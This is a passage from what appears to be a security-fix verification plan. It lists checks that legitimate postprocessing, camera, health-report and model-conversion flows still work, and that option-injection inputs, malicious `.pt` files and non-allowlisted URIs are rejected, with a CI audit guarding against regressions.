  identical outcomes; confirm option-injection inputs are rejected.
- #5/#6/#7: run the postprocessor, a camera preview/capture, and a DIO health
  report end-to-end on legitimate data and confirm identical results.
- #8: convert a legitimate model end-to-end (state dict and a trusted-source full
  checkpoint) and confirm the same generated DDA package; confirm a malicious
  `.pt` / non-allowlisted URI is rejected.
- #9: run the repo-audit check in CI; it fails if any disallowed pattern
  reappears in in-scope application code.
